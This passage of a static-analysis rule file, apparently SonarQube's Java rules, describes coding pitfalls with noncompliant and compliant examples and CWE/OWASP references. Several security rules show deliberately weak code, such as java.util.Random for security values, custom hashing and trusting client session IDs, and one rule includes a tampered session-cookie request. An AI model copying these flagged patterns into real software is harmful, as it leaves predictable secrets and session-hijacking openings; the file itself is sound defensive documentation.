            this method is optional for &lt;code&gt;TYPE_FORWARD_ONLY&lt;/code&gt;
            result sets. Second, it can be expensive (the driver may need to fetch the next row to answer the question).
            Finally, the specification is not clear
            on what should be returned when the &lt;code&gt;ResultSet&lt;/code&gt; is empty, so some drivers may return
            the opposite of what is expected.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            stmt.executeQuery(&quot;SELECT name, address FROM PERSON&quot;);
            ResultSet rs = stmt.getResultSet();
            while (! rs.isLast()) { // Noncompliant
            // process row
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            ResultSet rs = stmt.executeQuery(&quot;SELECT name, address FROM PERSON&quot;);
            while (rs.next()) {
            // process row
            }
            &lt;/pre&gt;
        </description>
        <tag>performance</tag>
        <tag>pitfall</tag>
        <tag>sql</tag>
    </rule>

    <rule key='S2234' priority='MAJOR'>
        <configKey>S2234</configKey>
        <name>Parameters should be passed in the correct order</name>
        <description>
            &lt;p&gt;When the names of parameters in a method call match the names of the method arguments, it
            contributes to clearer, more readable code. However, when
            the names match, but are passed in a different order than the method arguments, it indicates a mistake in
            the parameter order which will likely lead
            to unexpected results.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public double divide(int divisor, int dividend) {
            return divisor/dividend;
            }

            public void doTheThing() {
            int divisor = 15;
            int dividend = 5;

            double result = divide(dividend, divisor); // Noncompliant; operation succeeds, but result is unexpected
            //...
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public double divide(int divisor, int dividend) {
            return divisor/dividend;
            }

            public void doTheThing() {
            int divisor = 15;
            int dividend = 5;

            double result = divide(divisor, dividend);
            //...
            }
            &lt;/pre&gt;
        </description>
    </rule>

    <rule key='S2235' priority='CRITICAL'>
        <configKey>S2235</configKey>
        <name>IllegalMonitorStateException should not be caught</name>
        <description>
            &lt;p&gt;According to Oracle Javadoc:&lt;/p&gt;
            &lt;blockquote&gt;
            &lt;p&gt;&lt;code&gt;IllegalMonitorStateException&lt;/code&gt; is thrown when a thread has attempted to wait
            on an object's monitor or to notify other threads waiting
            on an object's monitor without owning the specified monitor.&lt;/p&gt;
            &lt;/blockquote&gt;
            &lt;p&gt;In other words, this exception can be thrown only in case of bad design because &lt;code&gt;Object.wait(...)&lt;/code&gt;,
            &lt;code&gt;Object.notify()&lt;/code&gt; and
            &lt;code&gt;Object.notifyAll()&lt;/code&gt; methods should never be called on an object whose monitor is not
            held. &lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public void doSomething(){
            ...
            try {
            ...
            anObject.notify();
            ...
            } catch(IllegalMonitorStateException e) {
            ...
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public void doSomething(){
            ...
            synchronized(anObject) {
            ...
            anObject.notify();
            ...
            }
            }
            &lt;/pre&gt;
        </description>
        <tag>error-handling</tag>
        <tag>multi-threading</tag>
    </rule>

    <rule key='S2236' priority='BLOCKER'>
        <configKey>S2236</configKey>
        <name>Methods &quot;wait(...)&quot;, &quot;notify()&quot; and &quot;notifyAll()&quot; should not be called on
            Thread instances
        </name>
        <description>
            &lt;p&gt;The methods &lt;code&gt;wait(...)&lt;/code&gt;, &lt;code&gt;notify()&lt;/code&gt; and &lt;code&gt;notifyAll()&lt;/code&gt;
            are available on a &lt;code&gt;Thread&lt;/code&gt; instance, but only
            because all classes in Java extend &lt;code&gt;Object&lt;/code&gt; and therefore automatically inherit those
            methods. But there are two very good reasons for not
            calling them on a &lt;code&gt;Thread&lt;/code&gt;:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; Internally, the JVM relies on these methods to change the state of the Thread (&lt;code&gt;BLOCKED&lt;/code&gt;,
            &lt;code&gt;WAITING&lt;/code&gt;, ...), so calling
            them will corrupt the behavior of the JVM. &lt;/li&gt;
            &lt;li&gt; It is not clear (perhaps even to the original coder) what is really expected. For instance, it is
            waiting for the execution of the Thread to
            suspended, or is it the acquisition of the object monitor that is waited for? &lt;/li&gt;
            &lt;/ul&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            Thread myThread = new Thread(new RunnableJob());
            ...
            myThread.wait(2000);
            &lt;/pre&gt;
        </description>
        <tag>multi-threading</tag>
    </rule>

    <rule key='S2245' priority='CRITICAL'>
        <configKey>S2245</configKey>
        <name>Using pseudorandom number generators (PRNGs) is security-sensitive</name>
        <description>
            &lt;p&gt;Using pseudorandom number generators (PRNGs) is security-sensitive. For example, it has led in the
            past to the following vulnerabilities:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-6386&quot;&gt;CVE-2013-6386&lt;/a&gt;
            &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3419&quot;&gt;CVE-2006-3419&lt;/a&gt;
            &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4102&quot;&gt;CVE-2008-4102&lt;/a&gt;
            &lt;/li&gt;
            &lt;/ul&gt;
            &lt;p&gt;When software generates predictable values in a context requiring unpredictability, it may be
            possible for an attacker to guess the next value that
            will be generated, and use this guess to impersonate another user or access sensitive information.&lt;/p&gt;
            &lt;p&gt;As the &lt;code&gt;java.util.Random&lt;/code&gt; class relies on a pseudorandom number generator,
            this class and relating &lt;code&gt;java.lang.Math.random()&lt;/code&gt;
            method should not be used for security-critical applications or for protecting sensitive data. In such
            context, the
            &lt;code&gt;java.security.SecureRandom&lt;/code&gt; class which relies on a cryptographically strong random
            number generator (RNG) should be used in place.&lt;/p&gt;
            &lt;h2&gt;Ask Yourself Whether&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; the code using the generated value requires it to be unpredictable. It is the case for all
            encryption mechanisms or when a secret value, such
            as a password, is hashed. &lt;/li&gt;
            &lt;li&gt; the function you use generates a value which can be predicted (pseudo-random). &lt;/li&gt;
            &lt;li&gt; the generated value is used multiple times. &lt;/li&gt;
            &lt;li&gt; an attacker can access the generated value. &lt;/li&gt;
            &lt;/ul&gt;
            &lt;p&gt;There is a risk if you answered yes to any of those questions.&lt;/p&gt;
            &lt;h2&gt;Recommended Secure Coding Practices&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; Use a cryptographically strong random number generator (RNG) like &quot;java.security.SecureRandom&quot;
            in place of this PRNG. &lt;/li&gt;
            &lt;li&gt; Use the generated random values only once. &lt;/li&gt;
            &lt;li&gt; You should not expose the generated random value. If you have to store it, make sure that the
            database or file is secure. &lt;/li&gt;
            &lt;/ul&gt;
            &lt;h2&gt;Sensitive Code Example&lt;/h2&gt;
            &lt;pre&gt;
            Random random = new Random(); // Sensitive use of Random
            byte bytes[] = new byte[20];
            random.nextBytes(bytes); // Check if bytes is used for hashing, encryption, etc...
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            SecureRandom random = new SecureRandom(); // Compliant for security-sensitive use cases
            byte bytes[] = new byte[20];
            random.nextBytes(bytes);
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure&quot;&gt;OWASP
            Top 10 2017 Category A3&lt;/a&gt; - Sensitive Data Exposure
            &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://cwe.mitre.org/data/definitions/338.html&quot;&gt;MITRE, CWE-338&lt;/a&gt;
            - Use of Cryptographically Weak Pseudo-Random Number Generator
            (PRNG) &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://cwe.mitre.org/data/definitions/330.html&quot;&gt;MITRE, CWE-330&lt;/a&gt;
            - Use of Insufficiently Random Values &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://cwe.mitre.org/data/definitions/326.html&quot;&gt;MITRE, CWE-326&lt;/a&gt;
            - Inadequate Encryption Strength &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/oTdGBQ&quot;&gt;CERT, MSC02-J.&lt;/a&gt; -
            Generate strong random numbers &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/UNcxBQ&quot;&gt;CERT, MSC30-C.&lt;/a&gt; -
            Do not use the rand() function for generating pseudorandom numbers
            &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/2ns-BQ&quot;&gt;CERT, MSC50-CPP.&lt;/a&gt;
            - Do not use std::rand() for generating pseudorandom numbers &lt;/li&gt;
            &lt;li&gt; Derived from FindSecBugs rule &lt;a href=&quot;https://h3xstream.github.io/find-sec-bugs/bugs.htm#PREDICTABLE_RANDOM&quot;&gt;Predictable
            Pseudo Random Number
            Generator&lt;/a&gt; &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cert</tag>
        <tag>cwe</tag>
        <tag>owasp-a3</tag>
        <securityStandards>
            <cwe>338,330,326</cwe>
            <OWASP>A3</OWASP>
        </securityStandards>
    </rule>

    <rule key='S2251' priority='MAJOR'>
        <configKey>S2251</configKey>
        <name>A &quot;for&quot; loop update clause should move the counter in the right direction</name>
        <description>
            &lt;p&gt;A &lt;code&gt;for&lt;/code&gt; loop with a counter that moves in the wrong direction is not an
            infinite loop. Because of wraparound, the loop will eventually
            reach its stop condition, but in doing so, it will run many, many more times than anticipated, potentially
            causing unexpected behavior. &lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public void doSomething(String [] strings) {
            for (int i = 0; i &amp;lt; strings.length; i--) { // Noncompliant;
            String string = strings[i]; // ArrayIndexOutOfBoundsException when i reaches -1
            //...
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public void doSomething(String [] strings) {
            for (int i = 0; i &amp;lt; strings.length; i++) {
            String string = strings[i];
            //...
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/aTdGBQ&quot;&gt;CERT, MSC54-J.&lt;/a&gt; -
            Avoid inadvertent wrapping of loop counters &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cert</tag>
    </rule>

    <rule key='S2252' priority='MAJOR'>
        <configKey>S2252</configKey>
        <name>Loop conditions should be true at least once</name>
        <description>
            &lt;p&gt;If a &lt;code&gt;for&lt;/code&gt; loop's condition is false before the first loop iteration, the
            loop will never be executed. Such loops are almost always
            bugs, particularly when the initial value and stop conditions are hard-coded.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            for (int i = 10; i &amp;lt; 10; i++) { // Noncompliant
            // ...
            &lt;/pre&gt;
        </description>
    </rule>

    <rule key='S2254' priority='CRITICAL'>
        <configKey>S2254</configKey>
        <name>&quot;HttpServletRequest.getRequestedSessionId()&quot; should not be used</name>
        <description>
            &lt;p&gt;According to the Oracle Java API, the &lt;code&gt;HttpServletRequest.getRequestedSessionId()&lt;/code&gt;
            method:&lt;/p&gt;
            &lt;blockquote&gt;
            &lt;p&gt;Returns the session ID specified by the client. This may not be the same as the ID of the current
            valid session for this request. If the client
            did not specify a session ID, this method returns null.&lt;/p&gt;
            &lt;/blockquote&gt;
            &lt;p&gt;The session ID it returns is either transmitted in a cookie or a URL parameter so by definition,
            nothing prevents the end-user from manually
            updating the value of this session ID in the HTTP request. &lt;/p&gt;
            &lt;p&gt;Here is an example of a updated HTTP header:&lt;/p&gt;
            &lt;pre&gt;
            GET /pageSomeWhere HTTP/1.1
            Host: webSite.com
            User-Agent: Mozilla/5.0
            Cookie: JSESSIONID=Hacked_Session_Value'''&quot;&amp;gt;
            &lt;/pre&gt;
            &lt;p&gt;Due to the ability of the end-user to manually change the value, the session ID in the request
            should only be used by a servlet container (E.G.
            Tomcat or Jetty) to see if the value matches the ID of an an existing session. If it does not, the user
            should be considered unauthenticated.
            Moreover, this session ID should never be logged as is but using a one-way hash to prevent hijacking of
            active sessions.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            if(isActiveSession(request.getRequestedSessionId()) ){
            ...
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.owasp.org/index.php/Top_10-2017_A2-Broken_Authentication&quot;&gt;OWASP
            Top 10 2017 Category A2&lt;/a&gt; - Broken Authentication &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;http://cwe.mitre.org/data/definitions/807&quot;&gt;MITRE, CWE-807&lt;/a&gt; -
            Reliance on Untrusted Inputs in a Security Decision &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.sans.org/top25-software-errors/#cat3&quot;&gt;SANS Top 25&lt;/a&gt;
            - Porous Defenses &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cwe</tag>
        <tag>owasp-a2</tag>
        <tag>sans-top25-porous</tag>
        <securityStandards>
            <cwe>807</cwe>
            <OWASP>A2</OWASP>
        </securityStandards>
    </rule>

    <rule key='S2257' priority='CRITICAL'>
        <configKey>S2257</configKey>
        <name>Using non-standard cryptographic algorithms is security-sensitive</name>
        <description>
            &lt;p&gt;The use of a non-standard algorithm is dangerous because a determined attacker may be able to break
            the algorithm and compromise whatever data has
            been protected. Standard algorithms like &lt;code&gt;SHA-256&lt;/code&gt;, &lt;code&gt;SHA-384&lt;/code&gt;,
            &lt;code&gt;SHA-512&lt;/code&gt;, ... should be used instead.&lt;/p&gt;
            &lt;p&gt;This rule tracks creation of &lt;code&gt;java.security.MessageDigest&lt;/code&gt; subclasses.&lt;/p&gt;
            &lt;h2&gt;Recommended Secure Coding Practices&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; Use a standard algorithm instead of creating a custom one. &lt;/li&gt;
            &lt;/ul&gt;
            &lt;h2&gt;Sensitive Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public class MyCryptographicAlgorithm extends MessageDigest {
            ...
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            MessageDigest digest = MessageDigest.getInstance(&quot;SHA-256&quot;);
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure&quot;&gt;OWASP
            Top 10 2017 Category A3&lt;/a&gt; - Sensitive Data Exposure
            &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://cwe.mitre.org/data/definitions/327.html&quot;&gt;CWE-327&lt;/a&gt; - Use
            of a Broken or Risky Cryptographic Algorithm &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.sans.org/top25-software-errors/#cat3&quot;&gt;SANS Top 25&lt;/a&gt;
            - Porous Defenses &lt;/li&gt;
            &lt;li&gt; Derived from FindSecBugs rule &lt;a href=&quot;https://h3xstream.github.io/find-sec-bugs/bugs.htm#CUSTOM_MESSAGE_DIGEST&quot;&gt;MessageDigest
            is Custom&lt;/a&gt;
            &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cwe</tag>
        <tag>owasp-a3</tag>
        <tag>sans-top25-porous</tag>
        <securityStandards>
            <cwe>327</cwe>
            <OWASP>A3</OWASP>
        </securityStandards>
    </rule>

    <rule key='S2259' priority='MAJOR'>
        <configKey>S2259</configKey>
        <name>Null pointers should not be dereferenced</name>
        <description>
            &lt;p&gt;A reference to &lt;code&gt;null&lt;/code&gt; should never be dereferenced/accessed. Doing so will
            cause a &lt;code&gt;NullPointerException&lt;/code&gt; to be thrown. At
            best, such an exception will cause abrupt program termination. At worst, it could expose debugging
            information that would be useful to an attacker, or
            it could allow an attacker to bypass security measures.&lt;/p&gt;
            &lt;p&gt;Note that when they are present, this rule takes advantage of &lt;code&gt;@CheckForNull&lt;/code&gt;
            and &lt;code&gt;@Nonnull&lt;/code&gt; annotations defined in &lt;a
            href=&quot;https://jcp.org/en/jsr/detail?id=305&quot;&gt;JSR-305&lt;/a&gt; to understand which values are
            and are not nullable except when &lt;code&gt;@Nonnull&lt;/code&gt; is used
            on the parameter to &lt;code&gt;equals&lt;/code&gt;, which by contract should always work with null.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            @CheckForNull
            String getName(){...}

            public boolean isNameEmpty() {
            return getName().length() == 0; // Noncompliant; the result of getName() could be null, but isn't
            null-checked
            }
            &lt;/pre&gt;
            &lt;pre&gt;
            Connection conn = null;
            Statement stmt = null;
            try{
            conn = DriverManager.getConnection(DB_URL,USER,PASS);
            stmt = conn.createStatement();
            // ...

            }catch(Exception e){
            e.printStackTrace();
            }finally{
            stmt.close(); // Noncompliant; stmt could be null if an exception was thrown in the try{} block
            conn.close(); // Noncompliant; conn could be null if an exception was thrown
            }
            &lt;/pre&gt;
            &lt;pre&gt;
            private void merge(@Nonnull Color firstColor, @Nonnull Color secondColor){...}

            public void append(@CheckForNull Color color) {
            merge(currentColor, color); // Noncompliant; color should be null-checked because merge(...) doesn't accept
            nullable parameters
            }
            &lt;/pre&gt;
            &lt;pre&gt;
            void paint(Color color) {
            if(color == null) {
            System.out.println(&quot;Unable to apply color &quot; + color.toString()); // Noncompliant;
            NullPointerException will be thrown
            return;
            }
            ...
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://cwe.mitre.org/data/definitions/476.html&quot;&gt;MITRE, CWE-476&lt;/a&gt;
            - NULL Pointer Dereference &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/QdcxBQ&quot;&gt;CERT, EXP34-C.&lt;/a&gt; -
            Do not dereference null pointers &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/aDdGBQ&quot;&gt;CERT, EXP01-J.&lt;/a&gt; -
            Do not use a null in a case where an object is required &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cert</tag>
        <tag>cwe</tag>
        <securityStandards>
            <cwe>476</cwe>
        </securityStandards>
    </rule>

    <rule key='S2272' priority='MINOR'>
        <configKey>S2272</configKey>
        <name>&quot;Iterator.next()&quot; methods should throw &quot;NoSuchElementException&quot;</name>
        <description>
            &lt;p&gt;By contract, any implementation of the &lt;code&gt;java.util.Iterator.next()&lt;/code&gt; method
            should throw a &lt;code&gt;NoSuchElementException&lt;/code&gt; exception
            when the iteration has no more elements. Any other behavior when the iteration is done could lead to
            unexpected behavior for users of this
            &lt;code&gt;Iterator&lt;/code&gt;. &lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public class MyIterator implements Iterator&amp;lt;String&amp;gt;{
            ...
            public String next(){
            if(!hasNext()){
            return null;
            }
            ...
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public class MyIterator implements Iterator&amp;lt;String&amp;gt;{
            ...
            public String next(){
            if(!hasNext()){
            throw new NoSuchElementException();
            }
            ...
            }
            }
            &lt;/pre&gt;
        </description>
        <tag>error-handling</tag>
        <tag>unpredictable</tag>
    </rule>

    <rule key='S2273' priority='MAJOR'>
        <configKey>S2273</configKey>
        <name>&quot;wait&quot;, &quot;notify&quot; and &quot;notifyAll&quot; should only be called when a lock is
            obviously held on an object
        </name>
        <description>
            &lt;p&gt;By contract, the method &lt;code&gt;Object.wait(...)&lt;/code&gt;, &lt;code&gt;Object.notify()&lt;/code&gt;
            and &lt;code&gt;Object.notifyAll()&lt;/code&gt; should be called by a
            thread that is the owner of the object's monitor. If this is not the case an &lt;code&gt;IllegalMonitorStateException&lt;/code&gt;
            exception is thrown. This rule
            reinforces this constraint by making it mandatory to call one of these methods only inside a &lt;code&gt;synchronized&lt;/code&gt;
            method or statement. &lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            private void removeElement() {
            while (!suitableCondition()){
            obj.wait();
            }
            ... // Perform removal
            }
            &lt;/pre&gt;
            &lt;p&gt;or&lt;/p&gt;
            &lt;pre&gt;
            private void removeElement() {
            while (!suitableCondition()){
            wait();
            }
            ... // Perform removal
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            private void removeElement() {
            synchronized(obj) {
            while (!suitableCondition()){
            obj.wait();
            }
            ... // Perform removal
            }
            }
            &lt;/pre&gt;
            &lt;p&gt;or&lt;/p&gt;
            &lt;pre&gt;
            private synchronized void removeElement() {
            while (!suitableCondition()){
            wait();
            }
            ... // Perform removal
            }
            &lt;/pre&gt;
        </description>
        <tag>multi-threading</tag>
    </rule>

    <rule key='S2274' priority='CRITICAL'>
        <configKey>S2274</configKey>
        <name>&quot;Object.wait(...)&quot; and &quot;Condition.await(...)&quot; should be called inside a &quot;while&quot;
            loop
        </name>
        <description>
            &lt;p&gt;According to the documentation of the Java &lt;code&gt;Condition&lt;/code&gt; interface:&lt;/p&gt;
            &lt;blockquote&gt;
            &lt;p&gt;When waiting upon a &lt;code&gt;Condition&lt;/code&gt;, a &quot;spurious wakeup&quot; is permitted
            to occur, in general, as a concession to the underlying platform
            semantics. This has little practical impact on most application programs as a Condition should always be
            waited upon in a loop, testing the state
            predicate that is being waited for. An implementation is free to remove the possibility of spurious wakeups
            but it is recommended that applications
            programmers always assume that they can occur and so always wait in a loop.&lt;/p&gt;
            &lt;/blockquote&gt;
            &lt;p&gt;The same advice is also found for the &lt;code&gt;Object.wait(...)&lt;/code&gt; method:&lt;/p&gt;
            &lt;blockquote&gt;
            &lt;p&gt;waits should always occur in loops, like this one:&lt;/p&gt;
            &lt;pre&gt;
            synchronized (obj) {
            while (&amp;lt;condition does not hold&amp;gt;){
            obj.wait(timeout);
            }
            ... // Perform action appropriate to condition
            }
            &lt;/pre&gt;
            &lt;/blockquote&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            synchronized (obj) {
            if (!suitableCondition()){
            obj.wait(timeout); //the thread can wake up even if the condition is still false
            }
            ... // Perform action appropriate to condition
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            synchronized (obj) {
            while (!suitableCondition()){
            obj.wait(timeout);
            }
            ... // Perform action appropriate to condition
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/EzdGBQ&quot;&gt;CERT THI03-J.&lt;/a&gt; -
            Always invoke wait() and await() methods inside a loop &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cert</tag>
        <tag>multi-threading</tag>
    </rule>

    <rule key='S2275' priority='BLOCKER'>
        <configKey>S2275</configKey>
        <name>Printf-style format strings should not lead to unexpected behavior at runtime</name>
        <description>
            &lt;p&gt;Because &lt;code&gt;printf&lt;/code&gt;-style format strings are interpreted at runtime, rather
            than validated by the Java compiler, they can contain errors
            that lead to unexpected behavior or runtime errors. This rule statically validates the good behavior of &lt;code&gt;printf&lt;/code&gt;-style
            formats when calling
            the &lt;code&gt;format(...)&lt;/code&gt; methods of &lt;code&gt;java.util.Formatter&lt;/code&gt;, &lt;code&gt;java.lang.String&lt;/code&gt;,
            &lt;code&gt;java.io.PrintStream&lt;/code&gt;,
            &lt;code&gt;MessageFormat&lt;/code&gt;, and &lt;code&gt;java.io.PrintWriter&lt;/code&gt; classes and the
            &lt;code&gt;printf(...)&lt;/code&gt; methods of &lt;code&gt;java.io.PrintStream&lt;/code&gt;
            or &lt;code&gt;java.io.PrintWriter&lt;/code&gt; classes. &lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            String.format(&quot;The value of my integer is %d&quot;, &quot;Hello World&quot;); // Noncompliant; an 'int'
            is expected rather than a String
            String.format(&quot;Duke's Birthday year is %tX&quot;, c); //Noncompliant; X is not a supported time
            conversion character
            String.format(&quot;Display %0$d and then %d&quot;, 1); //Noncompliant; arguments are numbered starting from
            1
            String.format(&quot;Not enough arguments %d and %d&quot;, 1); //Noncompliant; the second argument is missing
            String.format(&quot;%&amp;lt; is equals to %d&quot;, 2); //Noncompliant; the argument index '&amp;lt;'
            refers to the previous format specifier but there isn't one

            MessageFormat.format(&quot;Result {1}.&quot;, value); // Noncompliant; Not enough arguments. (first element
            is {0})
            MessageFormat.format(&quot;Result {{0}.&quot;, value); // Noncompliant; Unbalanced number of curly brace
            (single curly braces should be escaped)
            MessageFormat.format(&quot;Result ' {0}&quot;, value); // Noncompliant; Unbalanced number of quotes (single
            quote must be escaped)

            java.util.logging.Logger logger;
            logger.log(java.util.logging.Level.SEVERE, &quot;Result {1}!&quot;, 14); // Noncompliant - Not enough
            arguments.

            org.slf4j.Logger slf4jLog;
            org.slf4j.Marker marker;

            slf4jLog.debug(marker, &quot;message {}&quot;); // Noncompliant - Not enough arguments.

            org.apache.logging.log4j.Logger log4jLog;
            log4jLog.debug(&quot;message {}&quot;); // Noncompliant - Not enough arguments.
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            String.format(&quot;The value of my integer is %d&quot;, 3);
            String.format(&quot;Duke's Birthday year is %tY&quot;, c);
            String.format(&quot;Display %1$d and then %d&quot;, 1);
            String.format(&quot;Not enough arguments %d and %d&quot;, 1, 2);
            String.format(&quot;%d is equals to %&amp;lt;&quot;, 2);

            MessageFormat.format(&quot;Result {0}.&quot;, value);
            MessageFormat.format(&quot;Result {0} &amp;amp; {1}.&quot;, value, value);
            MessageFormat.format(&quot;Result {0}.&quot;, myObject);

            java.util.logging.Logger logger;
            logger.log(java.util.logging.Level.SEVERE, &quot;Result {1},{2}!&quot;, 14, 2);

            org.slf4j.Logger slf4jLog;
            org.slf4j.Marker marker;

            slf4jLog.debug(marker, &quot;message {}&quot;, 1);

            org.apache.logging.log4j.Logger log4jLog;
            log4jLog.debug(&quot;message {}&quot;, 1);
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.securecoding.cert.org/confluence/x/wQA1&quot;&gt;CERT, FIO47-C.&lt;/a&gt;
            - Use valid format strings &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cert</tag>
    </rule>

    <rule key='S2276' priority='BLOCKER'>
        <configKey>S2276</configKey>
        <name>&quot;wait(...)&quot; should be used instead of &quot;Thread.sleep(...)&quot; when a lock is held</name>
        <description>
            &lt;p&gt;If &lt;code&gt;Thread.sleep(...)&lt;/code&gt; is called when the current thread holds a lock, it
            could lead to performance and scalability issues, or even
            worse to deadlocks because the execution of the thread holding the lock is frozen. It's better to call &lt;code&gt;wait(...)&lt;/code&gt;
            on the monitor object to
            temporarily release the lock and allow other threads to run.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public void doSomething(){
            synchronized(monitor) {
            while(notReady()){
            Thread.sleep(200);
            }
            process();
            }
            ...
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public void doSomething(){
            synchronized(monitor) {
            while(notReady()){
            monitor.wait(200);
            }
            process();
            }
            ...
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/YTdGBQ&quot;&gt;CERT, LCK09-J.&lt;/a&gt; -
            Do not perform operations that can block while holding a lock &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cert</tag>
        <tag>multi-threading</tag>
        <tag>performance</tag>
    </rule>

    <rule key='S2293' priority='MINOR'>
        <configKey>S2293</configKey>
        <name>The diamond operator (&quot;&lt;&gt;&quot;) should be used</name>
        <description>
            &lt;p&gt;Java 7 introduced the diamond operator (&lt;code&gt;&amp;lt;&amp;gt;&lt;/code&gt;) to reduce the
            verbosity of generics code. For instance, instead of having to declare
            a &lt;code&gt;List&lt;/code&gt;'s type in both its declaration and its constructor, you can now simplify the
            constructor declaration with &lt;code&gt;&amp;lt;&amp;gt;&lt;/code&gt;,
            and the compiler will infer the type.&lt;/p&gt;
            &lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt; that this rule is automatically disabled when the project's &lt;code&gt;sonar.java.source&lt;/code&gt;
            is lower than &lt;code&gt;7&lt;/code&gt;.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            List&amp;lt;String&amp;gt; strings = new ArrayList&amp;lt;String&amp;gt;(); // Noncompliant
